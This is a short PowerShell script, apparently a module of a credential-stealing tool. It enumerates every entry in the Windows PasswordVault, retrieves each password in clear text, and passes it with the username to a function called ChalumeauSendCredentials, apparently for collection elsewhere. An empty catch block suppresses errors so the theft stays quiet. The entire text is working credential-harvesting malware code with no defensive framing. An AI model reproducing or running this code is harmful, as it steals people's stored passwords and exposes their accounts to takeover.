try
{
    $Script:vaultType = [Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
    $Script:vault =  new-object Windows.Security.Credentials.PasswordVault -ErrorAction silentlycontinue
    $Results = $Script:vault.RetrieveAll()
    foreach($credentry in  $Results)
    {
            $credobject = $Script:vault.Retrieve( $credentry.Resource, $credentry.UserName )
            ChalumeauSendCredentials -Secret "$($credobject.Password)" -Username "$($credobject.UserName)" -IsClearText 1 -source "password vault"             
    }
}catch{}